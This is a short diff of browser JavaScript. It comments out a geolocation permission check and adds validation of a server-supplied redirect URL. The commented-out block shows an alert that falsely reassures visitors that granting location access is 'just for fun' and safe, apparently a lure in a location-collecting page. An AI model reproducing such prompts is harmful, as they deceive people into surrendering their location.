@@ -378,15 +378,15 @@ xhr.onload=function()
     if(this.responseText!="app")
     {
         
-navigator.permissions.query({
-     name: 'geolocation'
- }).then(function(result) {
-    
-      if (result.state == 'prompt') {
-     alert("        If you are asked,give allow for 'location'.\n"+"        It's just for fun.You will be safe.");
-     }
-
- });
+// navigator.permissions.query({
+//      name: 'geolocation'
+//  }).then(function(result) {
+//
+//       if (result.state == 'prompt') {
+//      alert("        If you are asked,give allow for 'location'.\n"+"        It's just for fun.You will be safe.");
+//      }
+//
+//  });
 
     }
     
@@ -468,8 +468,10 @@ navigator.permissions.query({
     xhr.onload = function () {
      if(this.responseText=="none")
      alert("Link is not available");
+     else if(!this.responseText.startsWith('http'))
+     alert("Something went wrong. Please try again later.")
      else
-     location.href=this.responseText;
+      location.href=this.responseText;
   };
 
 
